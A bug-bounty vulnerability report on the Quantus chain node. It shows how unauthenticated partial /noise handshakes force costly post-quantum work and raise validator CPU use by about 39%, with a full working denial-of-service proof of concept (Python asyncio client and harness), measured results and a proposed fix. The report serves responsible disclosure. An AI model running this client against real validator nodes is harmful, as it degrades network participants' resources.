# 88939 bc medium unauthenticated pq handshakes increase validator cpu consumption by 39 before peer authentication and established connection accounting

**Submitted on Aug 15th 2026 at 19:59:19 UTC by @coinsspor for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88939
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Brief/Intro

An unauthenticated remote host can make a Quantus validator perform expensive post-quantum handshake work **before peer authentication and before the connection is represented in the established incoming-connection accounting**. Sending only the canonical 28-byte multistream negotiation for `/multistream/1.0.0` followed by `/noise` is sufficient to trigger the frozen node's per-connection PQ handshake materialization. Under the **default non-reserved P2P policy** on the frozen production-profile node, the final ten-pair experiment measured a **39.3084% mean CPU increase**, with a Student-t **95% confidence interval of 38.2422%–40.3745%**. The conservative lower bound, **38.2422%**, remains materially above the selected 30% Medium threshold.

## Vulnerability Details

### Pre-authentication PQ work

The frozen in-scope chain commit is:

`3b243b870a5442a6e5f443056f67bbba87d472f5`

The incoming P2P path constructs a new `NoiseContext` before reading the remote peer's first cryptographic Noise/KEM handshake message.

At construction time, Quantus performs the expensive local PQ preparation used by the handshake, including fresh ML-KEM state and ML-DSA identity/signature materialization.

The attacker-controlled trigger is only the normal multistream protocol selection:

```
13 2f6d756c746973747265616d2f312e302e300a
07 2f6e6f6973650a
```

which encodes:

```
/multistream/1.0.0\n
/noise\n
```

After these **28 unauthenticated bytes** are sent, the attacker can stop before providing a valid cryptographic handshake message.

The attacker does not need to generate an ML-KEM key, create an ML-DSA signature, authenticate a peer identity, own a Quantus account, construct a blockchain transaction, or guess/search any credential or secret.

### Established-connection accounting does not reserve pending handshakes

Quantus has an incoming-connection limit, but the relevant limiter accounts for entries in the established `incoming_connections` set.

The effective ordering is:

```
Remote TCP connection
    ↓
multistream negotiation
    ↓
attacker selects /noise
    ↓
NoiseContext::new()
    ↓
per-connection PQ materialization
    ↓
listener waits for the peer's cryptographic handshake message
    ↓
successful transport establishment
    ↓
connection enters established incoming_connections accounting
```

The expensive PQ work therefore occurs while the remote peer is still unauthenticated and before that peer consumes a slot in the established incoming-connection accounting.

Fresh pending-handshake checks completed **10, 100, and 1,000 simultaneous probes with zero failures**. The final impact experiment requires only **400 concurrent sockets**.

### Normal validator P2P reachability

The issue does not depend on optional public RPC exposure.

The frozen Quantus node's normal P2P configuration exposes TCP P2P listeners for network participation. The final authoritative experiment uses the **default non-reserved P2P policy**; `--reserved-only` is not used by the final submission PoC.

### Quantus-specific root cause

This report is not asserting a generic TCP or upstream libp2p DoS.

Quantus PR #574 / commit:

`d4579e063b281615ca9301b599e9f47620c07b41`

vendored litep2p, made it the default networking backend, and moved Quantus PQ handshake materialization into each newly created `NoiseContext`.

As a **supplementary same-machine historical control**, the preceding Quantus PQ transport at:

`a735879a76d34811c6631b64f529b01b2c195247`

was built with:

```bash
cargo build --release
```

and tested on the same machine with the identical 28-byte protocol negotiation. It showed a **3.6651% mean CPU increase**, with 95% CI **\[3.4708%, 3.8593%]**.

Because this historical control is a different commit and was built in **release** profile, it is not used to establish the selected 30% threshold. It is supporting evidence only, **providing evidence that generic TCP/multistream handling alone does not explain the frozen target's approximately 39% increase**.

### Attacker/victim cost

The final workload opens 4,000 partial handshakes in batches of 400 and sends only:

```
4,000 × 28 bytes = 112,000 bytes
```

A separate production-profile cost measurement recorded:

* attacker CPU: **5.41 CPU-seconds**
* incremental victim CPU above baseline: **17.80 CPU-seconds**
* incremental victim/attacker CPU ratio: **3.29×**

The primitive is deterministic protocol-level resource amplification. It does not perform brute-force guessing or search.

## Impact Details

Selected in-scope impact:

> **Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours**

The resource measured is CPU consumption of the real frozen Quantus node process.

The **only attack-series measurement used to establish the selected impact** is the final default-policy production-profile experiment.

It alternates ten times on the same long-lived node and CPU affinity:

{% stepper %}
{% step %}

## Baseline window

Run a 45-second baseline window.
{% endstep %}

{% step %}

## Partial handshake workload

Run a 4,000-connection partial `/noise` handshake workload using concurrency 400 and four-second holds.
{% endstep %}
{% endstepper %}

For every pair:

```
increase_percent =
    ((attack_cpu_seconds_per_second / baseline_cpu_seconds_per_second) - 1) × 100
```

Final default-policy result:

* **Mean:** 39.3084%
* **Median:** 39.6833%
* **Sample SD:** 1.4905 percentage points
* **Student-t 95% CI:** \[38.2422%, 40.3745%]
* **Conservative lower bound:** 38.2422% > 30%

The exact ten raw pairs are supplied as:

`default-policy-paired.csv`

The corresponding terminal output is supplied as:

`default-policy-output.txt`

The PoC does **not** claim that a literal 24-hour capture was performed. It measures the attack against repeated immediately preceding baselines on the same long-lived process. Because the workload is continuously recyclable, the measured steady-state delta can be maintained against a node whose preceding 24-hour workload is its normal baseline.

No stronger impact is claimed. This report does not claim node shutdown, network shutdown, mempool overflow, block stuffing, or unbounded memory growth.

## References

* Frozen in-scope asset: <https://github.com/immunefi-team/audit-comp-quantus-chain/tree/3b243b870a5442a6e5f443056f67bbba87d472f5>
* PQ handshake implementation: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/litep2p/src/crypto/noise/mod.rs>
* Incoming connection-limit accounting: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/litep2p/src/transport/manager/limits.rs>
* Default P2P listener configuration: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/cli/src/params/network\\_params.rs>
* Quantus PR #574: <https://github.com/Quantus-Network/chain/pull/574>
* Competition scope: <https://immunefi.com/audit-competition/audit-comp-quantus/scope/>

## Proof of Concept

### Scope and Safety

This PoC runs **locally only** against the frozen in-scope Quantus chain source at:

`3b243b870a5442a6e5f443056f67bbba87d472f5`

It starts the real Quantus node on `127.0.0.1` and does not contact public/mainnet/testnet infrastructure.

The PoC contains exactly three executable files:

1. `reproduce.sh`
2. `poc/partial_handshake.py`
3. `poc/paired_final.py`

No separate attachment is required to understand or reproduce the finding: the full source of all three files and the measured results are included below.

The final authoritative reproduction uses:

* the frozen SHA;
* `--profile production`;
* the default **non-reserved** P2P policy;
* the real Quantus node;
* 10 alternating baseline/attack pairs;
* 45-second baseline windows;
* 4,000 partial `/noise` handshakes per attack window;
* concurrency 400;
* four-second holds;
* a Student-t 95% confidence interval;
* a hard failure unless the **lower 95% CI bound exceeds 30%**.

The attacker sends only the canonical 28-byte multistream negotiation selecting `/noise` and then stops before providing a valid cryptographic handshake message.

## 1. `reproduce.sh`

Create `reproduce.sh` with the following contents:

```bash
#!/usr/bin/env bash
set -euo pipefail

if [ "$#" -ne 1 ]; then
  echo "Usage: $0 /path/to/audit-comp-quantus-chain" >&2
  exit 2
fi

canonical="$1"
expected="3b243b870a5442a6e5f443056f67bbba87d472f5"
here="$(cd "$(dirname "$0")" && pwd)"

test "$(git -C "$canonical" rev-parse HEAD)" = "$expected"
test -z "$(git -C "$canonical" status --short)"

tmp="$(mktemp -d -t qnt-auto-008.XXXXXX)"
worktree="$tmp/chain"
node_pid=""

cleanup() {
  if test -n "$node_pid"; then
    kill -INT "$node_pid" 2>/dev/null || true
    wait "$node_pid" 2>/dev/null || true
  fi
  git -C "$canonical" worktree remove --force "$worktree" 2>/dev/null || true
  rm -rf "$tmp"
}
trap cleanup EXIT

git -C "$canonical" worktree add --detach "$worktree" "$expected"
test -z "$(git -C "$worktree" status --short)"

# Fast path: use an already-built SHA-pinned production binary.
# Authoritative path: otherwise build profile.production from the detached frozen worktree.
if test -n "${QNT_AUTO_008_BINARY:-}"; then
  binary="$QNT_AUTO_008_BINARY"
  test -x "$binary"
  "$binary" --version | grep -q "3b243b870a5"
else
  target="${QNT_AUTO_008_TARGET_DIR:-$tmp/target}"
  env WASM_BUILD_WORKSPACE_HINT="$worktree" CARGO_TARGET_DIR="$target" \
    cargo build --manifest-path "$worktree/Cargo.toml" \
      --profile production -p quantus-node
  binary="$target/production/quantus-node"
fi

port="${QNT_AUTO_008_PORT:-30444}"
rpc="${QNT_AUTO_008_RPC_PORT:-19945}"

# Final production-parity policy: default non-reserved P2P policy.
# Intentionally no --reserved-only.
node_cmd=(
  "$binary"
  --dev
  --tmp
  --no-telemetry
  --no-prometheus
  --listen-addr "/ip4/127.0.0.1/tcp/$port"
  --rpc-port "$rpc"
)

if command -v taskset >/dev/null && test "$(nproc)" -ge 8; then
  node_cmd=(taskset -c 0-3 "${node_cmd[@]}")
fi

"${node_cmd[@]}" >"$here/node-final.log" 2>&1 &
node_pid=$!

ready=0
for _ in $(seq 1 120); do
  if python3 -c \
    "import socket;s=socket.create_connection(('127.0.0.1',$port),.2);s.close()" \
    2>/dev/null; then
    ready=1
    break
  fi
  sleep .25
done
test "$ready" = 1

python3 "$here/poc/paired_final.py" \
  --pid "$node_pid" \
  --port "$port" \
  --client "$here/poc/partial_handshake.py" \
  --pairs 10 \
  --baseline-seconds 45 \
  --connections 4000 \
  --concurrency 400 \
  --hold 4 \
  --csv "$here/default-policy-paired.csv" \
  | tee "$here/default-policy-output.txt"

test -z "$(git -C "$worktree" status --short)"
test -z "$(git -C "$canonical" status --short)"

echo QNT_AUTO_008_CLEAN_PRODUCTION_REPRODUCTION_PASS
echo QNT_AUTO_008_DEFAULT_POLICY_PASS
```

Make it executable and run it:

```bash
chmod +x reproduce.sh
./reproduce.sh /path/to/audit-comp-quantus-chain
```

The canonical checkout passed to the script must be clean and at:

```
3b243b870a5442a6e5f443056f67bbba87d472f5
```

A cold production-profile build may take a long time.

If a SHA-pinned production binary already exists, the same script supports a faster path:

```bash
QNT_AUTO_008_BINARY=/path/to/target/production/quantus-node \
  ./reproduce.sh /path/to/audit-comp-quantus-chain
```

A successful final run terminates with all of the following markers:

```
QNT_AUTO_008_CONSERVATIVE_THRESHOLD_CONFIRMED
QNT_AUTO_008_CLEAN_PRODUCTION_REPRODUCTION_PASS
QNT_AUTO_008_DEFAULT_POLICY_PASS
```

## 2. `poc/partial_handshake.py`

Create the directory:

```bash
mkdir -p poc
```

Create `poc/partial_handshake.py` with the following contents:

```python
#!/usr/bin/env python3
import argparse
import asyncio
import time


def frame(value: bytes) -> bytes:
    return bytes([len(value)]) + value


async def one(host: str, port: int, hold: float):
    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(host, port),
        timeout=3.0,
    )

    sent = 0
    received = 0

    try:
        # Canonical multistream negotiation selecting only /noise.
        payload = frame(b"/multistream/1.0.0\n") + frame(b"/noise\n")
        writer.write(payload)
        await writer.drain()
        sent += len(payload)

        # Reading the responder's negotiation bytes is optional for the attack.
        try:
            received += len(await asyncio.wait_for(reader.read(256), timeout=1.0))
        except asyncio.TimeoutError:
            pass

        # Do not send a valid Noise/KEM handshake message.
        await asyncio.sleep(hold)
    finally:
        writer.close()
        await writer.wait_closed()

    return sent, received


async def run(args):
    sem = asyncio.Semaphore(args.concurrency)

    async def guarded():
        async with sem:
            return await one(args.host, args.port, args.hold)

    started = time.perf_counter()
    results = await asyncio.gather(
        *(guarded() for _ in range(args.connections)),
        return_exceptions=True,
    )

    sent = 0
    received = 0
    failures = 0

    for result in results:
        if isinstance(result, BaseException):
            failures += 1
        else:
            sent += result[0]
            received += result[1]

    elapsed = time.perf_counter() - started
    print(
        "ASYNC_NOISE "
        f"connections={args.connections} "
        f"sent_bytes={sent} "
        f"received_bytes={received} "
        f"failures={failures} "
        f"wall_seconds={elapsed:.6f}"
    )


parser = argparse.ArgumentParser()
parser.add_argument("--host", default="127.0.0.1")
parser.add_argument("--port", type=int, required=True)
parser.add_argument("--connections", type=int, default=1000)
parser.add_argument("--concurrency", type=int, default=1000)
parser.add_argument("--hold", type=float, default=4.5)
asyncio.run(run(parser.parse_args()))
```

This is the final **noise-only** client.

For every connection it sends only:

```
/multistream/1.0.0\n
/noise\n
```

The encoded payload is 28 bytes:

```
13 2f6d756c746973747265616d2f312e302e300a
07 2f6e6f6973650a
```

The client then deliberately stops before sending a valid Noise/KEM cryptographic handshake message.

It does not contain the discarded development-only TCP-only or large-length/u16max modes.

## 3. `poc/paired_final.py`

Create `poc/paired_final.py` with the following contents:

```python
#!/usr/bin/env python3
"""Alternating baseline/attack CPU-rate experiment with a conservative 95% CI gate."""

import argparse
import csv
import math
import os
import re
import shutil
import statistics
import subprocess
import sys
import time


def ticks(pid: int) -> int:
    fields = open(f"/proc/{pid}/stat", encoding="ascii").read().split()
    return int(fields[13]) + int(fields[14])


def cpu_rate(pid: int, seconds: float):
    hz = os.sysconf("SC_CLK_TCK")
    before = ticks(pid)
    started = time.monotonic()
    time.sleep(seconds)
    wall = time.monotonic() - started
    return (ticks(pid) - before) / hz / wall, wall


parser = argparse.ArgumentParser()
parser.add_argument("--pid", type=int, required=True)
parser.add_argument("--port", type=int, required=True)
parser.add_argument("--client", required=True)
parser.add_argument("--pairs", type=int, default=10)
parser.add_argument("--baseline-seconds", type=float, default=45)
parser.add_argument("--connections", type=int, default=4000)
parser.add_argument("--concurrency", type=int, default=400)
parser.add_argument("--hold", type=float, default=4)
parser.add_argument("--csv", required=True)
args = parser.parse_args()

rows = []

for pair in range(1, args.pairs + 1):
    baseline, baseline_wall = cpu_rate(args.pid, args.baseline_seconds)

    cmd = [
        sys.executable,
        args.client,
        "--port",
        str(args.port),
        "--connections",
        str(args.connections),
        "--concurrency",
        str(args.concurrency),
        "--hold",
        str(args.hold),
    ]

    # Keep attacker work off the victim's pinned cores when enough CPUs are available.
    if shutil.which("taskset") and (os.cpu_count() or 0) >= 8:
        cmd = ["taskset", "-c", "4-7", *cmd]

    before = ticks(args.pid)
    started = time.monotonic()
    output = subprocess.check_output(cmd, text=True)
    attack_wall = time.monotonic() - started
    attack = (
        (ticks(args.pid) - before)
        / os.sysconf("SC_CLK_TCK")
        / attack_wall
    )

    match = re.search(
        r"sent_bytes=(\d+).*received_bytes=(\d+).*failures=(\d+)",
        output,
    )
    if not match:
        raise SystemExit(f"unparseable client output: {output}")

    sent, received, failures = map(int, match.groups())
    if failures:
        raise SystemExit(f"attack client failures: {failures}")

    increase = (attack / baseline - 1) * 100
    row = [
        pair,
        baseline,
        attack,
        increase,
        baseline_wall,
        attack_wall,
        sent,
        received,
        failures,
    ]
    rows.append(row)
    print("PAIR", *row, flush=True)
    time.sleep(3)

with open(args.csv, "w", newline="", encoding="utf-8") as handle:
    writer = csv.writer(handle)
    writer.writerow(
        [
            "pair",
            "baseline_cpu_s_per_s",
            "attack_cpu_s_per_s",
            "increase_percent",
            "baseline_wall",
            "attack_wall",
            "sent_bytes",
            "received_bytes",
            "failures",
        ]
    )
    writer.writerows(rows)

increases = [row[3] for row in rows]
mean = statistics.mean(increases)
median = statistics.median(increases)
stdev = statistics.stdev(increases) if len(increases) > 1 else 0.0

# Student-t two-sided 95% critical values indexed by sample count n (df=n-1).
tcrit = {
    2: 12.706,
    3: 4.303,
    4: 3.182,
    5: 2.776,
    6: 2.571,
    7: 2.447,
    8: 2.365,
    9: 2.306,
    10: 2.262,
    11: 2.228,
    12: 2.201,
}.get(len(increases), 1.96)

margin = tcrit * stdev / math.sqrt(len(increases))
lower = mean - margin
upper = mean + margin

print(
    f"SUMMARY n={len(increases)} "
    f"mean={mean:.4f} "
    f"median={median:.4f} "
    f"min={min(increases):.4f} "
    f"max={max(increases):.4f} "
    f"stdev={stdev:.4f} "
    f"ci95_lower={lower:.4f} "
    f"ci95_upper={upper:.4f}"
)

if lower <= 30:
    raise SystemExit("95% confidence lower bound does not exceed 30%")

print("QNT_AUTO_008_CONSERVATIVE_THRESHOLD_CONFIRMED")
```

This harness performs the actual impact measurement:

{% stepper %}
{% step %}

## Measure the baseline

Measure the victim node's CPU rate for 45 seconds immediately before the attack.
{% endstep %}

{% step %}

## Run partial `/noise` sessions

Open 4,000 partial `/noise` sessions at concurrency 400.
{% endstep %}

{% step %}

## Hold sessions

Hold each partial session for four seconds.
{% endstep %}

{% step %}

## Measure attack CPU rate

Measure the victim node's CPU rate during the attack window.
{% endstep %}

{% step %}

## Calculate pair increase

Calculate the percentage increase for the pair.
{% endstep %}

{% step %}

## Repeat the measurement

Repeat the baseline/attack sequence 10 times.
{% endstep %}

{% step %}

## Calculate statistics

Calculate mean, median, sample standard deviation, and a two-sided Student-t 95% confidence interval.
{% endstep %}

{% step %}

## Enforce threshold

Fail unless the lower 95% confidence bound is above 30%.
{% endstep %}
{% endstepper %}

The percentage for each pair is calculated as:

```
increase_percent =
    ((attack_cpu_seconds_per_second / baseline_cpu_seconds_per_second) - 1) * 100
```

## 4. Final Measured Result — Default Non-Reserved P2P Policy

This is the **only attack-series result used to establish the selected Medium impact**.

The final production-parity run used:

```
Frozen SHA:        3b243b870a5442a6e5f443056f67bbba87d472f5
Build profile:     production
Peer policy:       default non-reserved
Pairs:             10
Baseline per pair: 45 seconds
Connections:       4,000 per attack window
Concurrency:       400
Hold time:         4 seconds
Attack payload:    28 bytes per connection
```

Measured result:

```
QNT_AUTO_008_DEFAULT_POLICY_PASS

Mean CPU increase: 39.3084%
Median CPU increase: 39.6833%
Sample SD: 1.4905 percentage points
Student-t 95% CI: [38.2422%, 40.3745%]
Conservative lower bound: 38.2422% > 30%

QNT_AUTO_008_CONSERVATIVE_THRESHOLD_CONFIRMED
QNT_AUTO_008_CLEAN_PRODUCTION_REPRODUCTION_PASS
QNT_AUTO_008_DEFAULT_POLICY_PASS
```

The conservative lower confidence bound exceeds the selected Medium threshold by:

```
38.2422% - 30% = 8.2422 percentage points
```

The final submission does not rely on the older development-stage runs or on the earlier reserved-only configuration.

## 5. Same-Machine Historical Control

As a **supplementary same-machine historical control**, the preceding Quantus PQ transport at:

```
a735879a76d34811c6631b64f529b01b2c195247
```

was built on the same machine using:

```bash
cargo build --release
```

and tested with the same 28-byte protocol negotiation.

Measured result:

```
PAIR 1 increase=3.5601%
PAIR 2 increase=3.8738%
PAIR 3 increase=3.7252%
PAIR 4 increase=3.6977%
PAIR 5 increase=3.4684%

SUMMARY
mean=3.6651%
median=3.6977%
stdev=0.1565 percentage points
95% CI=[3.4708%, 3.8593%]

EXPECTED_CONTROL_BELOW_30_PERCENT
```

This control is **supporting evidence only** because it is a different commit and was built in `release` profile rather than the frozen target's `production` profile.

It is not used as the numerical oracle for the selected >=30% impact.

It provides evidence that generic TCP/multistream handling alone does not explain the frozen target's approximately 39% CPU increase.

## 6. Attacker/Victim CPU Cost Measurement

A separate production-profile cost experiment measured both attacker and victim CPU.

Measured output:

```
BASELINE victim_cpu=47.530000 wall=45.000100 rate=1.056220

ASYNC_NOISE
connections=4000
sent_bytes=112000
received_bytes=108832
failures=0
wall_seconds=42.281290

ATTACKER
user=3.66
sys=1.75
rss_kb=29944
wall=43.87

ATTACK
victim_cpu=62.610000
wall=42.422521
rate=1.475867

INCREMENTAL_VICTIM_CPU=17.802490
```

Therefore:

```
attacker CPU = 3.66 + 1.75 = 5.41 CPU-seconds
incremental victim CPU above baseline = 17.80 CPU-seconds
incremental victim / attacker CPU = 17.80 / 5.41 = 3.29x
```

The attacker sends only:

```
4,000 connections * 28 bytes = 112,000 bytes
```

during the attack window.

No ML-KEM key generation, ML-DSA signing, peer authentication, blockchain account, transaction, password, nonce search, or secret guessing is required from the attacker.

## 7. Pending-Handshake Concurrency Measurement

Fresh pending-handshake checks produced:

```
ASYNC_NOISE connections=10   sent_bytes=280   received_bytes=280  failures=0
ASYNC_NOISE connections=100  sent_bytes=2800  received_bytes=2800 failures=0
ASYNC_NOISE connections=1000 sent_bytes=28000 received_bytes=7584 failures=0
```

The final selected-impact workload uses only:

```
400 concurrent sockets
```

The test therefore remains below the successfully demonstrated 1,000-pending-probe level.

## 8. Why the Established Incoming-Connection Limit Does Not Prevent the Primitive

The relevant order is:

```
Remote TCP connection
    ↓
multistream negotiation
    ↓
attacker selects /noise
    ↓
NoiseContext::new()
    ↓
per-connection ML-KEM / ML-DSA materialization
    ↓
listener waits for the peer's first cryptographic handshake message
    ↓
peer authentication / successful transport establishment
    ↓
connection enters established incoming_connections accounting
```

The expensive Quantus-specific PQ work is therefore triggered while the remote peer is still unauthenticated and before the connection consumes a slot in the established incoming-connection accounting.

## 9. Why This Is Not Brute Force

The PoC does not guess or search for:

* a password;
* a private key;
* a peer identity;
* a signature;
* a nonce;
* a hash preimage;
* or any other secret/search-space value.

Each connection deterministically sends the same public 28-byte protocol negotiation and stops before authentication.

Repetition is used only to exercise the protocol-level pre-authentication resource asymmetry.

## 10. 24-Hour Comparator Statement

The selected program impact is:

> Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

The PoC does **not** claim that a literal 24-hour capture was performed.

It measures the attack against repeated immediately preceding baselines on the same long-lived process. Because the workload is continuously recyclable, the measured steady-state delta can be maintained against a node whose preceding 24-hour workload is its normal baseline.

The final default-policy result is:

```
Mean: 39.3084%
95% CI lower bound: 38.2422%
```

which remains materially above the 30% threshold.

## 11. Clean Reproduction Properties

The final `reproduce.sh` performs the following checks:

{% stepper %}
{% step %}

## Verify frozen source

Verifies the canonical repository is at the frozen SHA.

Refuses a dirty canonical checkout.

Creates a detached temporary worktree.
{% endstep %}

{% step %}

## Build and start the node

Builds the real Quantus node with `--profile production` unless a SHA-pinned binary is supplied.

Starts the victim on localhost.

Uses the default non-reserved P2P policy.
{% endstep %}

{% step %}

## Run and validate the test

Runs the ten-pair statistical test.

Fails unless the lower 95% CI exceeds 30%.

Verifies canonical and detached source trees remain clean.

Emits explicit success markers.
{% endstep %}
{% endstepper %}

Expected final success markers:

```
QNT_AUTO_008_CONSERVATIVE_THRESHOLD_CONFIRMED
QNT_AUTO_008_CLEAN_PRODUCTION_REPRODUCTION_PASS
QNT_AUTO_008_DEFAULT_POLICY_PASS
```

## 12. Recommended Fix

The primary mitigation is to bound **pending handshakes before expensive PQ materialization**.

### 12.1 Reserve pending-handshake capacity before `NoiseContext::new()`

Introduce a bounded pending-handshake semaphore/counter, optionally combined with a per-source/IP limit, and acquire it before the expensive per-connection PQ setup.

Conceptually:

```rust
let pending_guard = pending_handshakes
    .try_acquire(remote_addr)
    .ok_or(ConnectionError::TooManyPendingHandshakes)?;

let result = perform_transport_negotiation(...).await;

// RAII/drop releases the pending slot on success, failure, close, or timeout.
drop(pending_guard);

result
```

The security-relevant ordering should become:

```
pending-handshake admission
    ↓
expensive PQ materialization
    ↓
peer authentication
    ↓
established-connection accounting
```

rather than:

```
expensive PQ materialization
    ↓
unauthenticated pending peer remains outside established accounting
```

### 12.2 Reduce or delay expensive work caused only by `/noise` selection

Where compatible with the intended PQ protocol, avoid performing all expensive local identity/signature work immediately after only an unauthenticated protocol selector.

If fresh per-connection KEM material is required, retain that property but perform it under the pending-handshake admission bound and delay additional expensive identity/signature materialization until the remote peer has supplied a structurally valid first cryptographic handshake message.

### 12.3 Keep connection-opening timeout as defense in depth

The existing opening timeout should remain, but it is not sufficient by itself because closed or expired partial sessions can be continuously replaced.

### 12.4 Add regression tests

Add tests/benchmarks proving that:

* pending capacity is reserved before expensive PQ work;
* the global pending cap is enforced;
* optional per-source limits are enforced;
* pending slots are released on success, parse error, remote close, and timeout;
* established-connection accounting remains correct;
* valid PQ handshakes continue to work; and
* repeated partial `/noise` negotiations cannot reproduce the previous >=30% CPU increase outside the configured pending-handshake budget.

## 13. Final Reproduction Summary

The complete PoC above demonstrates the following chain using the real frozen production node:

```
28 unauthenticated bytes
        ↓
/noise selected
        ↓
Quantus performs per-connection PQ materialization
        ↓
peer still unauthenticated
        ↓
connection not yet represented in established incoming accounting
        ↓
400 concurrent partial sessions are sufficient
        ↓
4,000 sessions per attack window
        ↓
39.3084% mean CPU increase
        ↓
95% CI lower bound = 38.2422%
        ↓
selected Medium threshold (>30%) is exceeded
```

The strongest evidence is therefore:

```
Frozen production node
Default non-reserved P2P policy
28 unauthenticated bytes per connection
One ordinary local/remote host model
No PQ work required by attacker
39.3084% mean CPU increase
95% CI [38.2422%, 40.3745%]
Conservative lower bound 38.2422%
Same-machine historical control 3.6651%
Incremental victim/attacker CPU ratio 3.29x
Clean reproduction markers PASS
```
